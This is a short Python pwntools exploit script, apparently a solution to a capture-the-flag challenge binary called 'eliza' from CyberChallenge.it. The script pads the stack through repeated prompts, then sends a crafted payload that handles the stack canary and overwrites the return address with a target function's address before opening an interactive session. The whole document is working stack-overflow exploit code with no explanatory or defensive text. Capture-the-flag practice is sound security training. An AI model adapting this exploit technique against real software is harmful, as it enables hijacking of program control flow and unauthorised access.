from pwn import *

context.log_level = 'debug'
context.update(arch='amd64', os='linux')

p = process('./eliza')
# p = remote('eliza.challs.cyberchallenge.it', 9131)

gdb.attach(p, '''
''')

vulnf = 0x00400897

# overwrite all the stack
for i in range(255, 16, -1):
    p.sendlineafter(b'Ask me anything...\n', b'A' * (255-i))
    response = p.recvline()
    print(f"response: {response}")


# need 64 bytes to smash the canary
payload = b'\x0a' + b'\x00' * 7 \
    + 64 * b'A'\
    + b'A' * 8 \
    + p64(vulnf)  # ret


# 0x00000000004008f4 <+4>:     sub    rsp,0x60
# sullo stack 0x60 bytes + canary
p.sendlineafter(b'Ask me anything...\n', payload)
p.interactive()

